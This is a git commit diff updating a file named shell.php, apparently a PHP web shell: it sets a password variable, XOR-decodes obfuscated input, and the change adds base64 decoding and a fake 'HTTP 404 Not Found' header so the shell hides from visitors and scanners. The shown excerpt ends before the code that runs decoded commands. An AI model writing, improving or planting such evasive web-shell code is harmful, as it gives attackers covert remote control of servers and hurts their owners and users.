0f1980d991843b5535921523d43069e2b68d2fa6
金枪银矛小霸王 <ch1ngsec@outlook.com>
2021-02-23 18:10:56 +0800

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,9 +1,10 @@
 <?php
 $pass = "data";
-$number = 2;
+$number = 99;
+header("HTTP/1.1 404 Not Found");
 function decoder($s,$number){
 	$res = '';
-	$s = rtrim($s,'/');
+	$s = rtrim(base64_decode($s),'/');
 	$s = explode('/', $s);
 	foreach ($s as $key => $value) {
 		$res .= chr($value^$number);
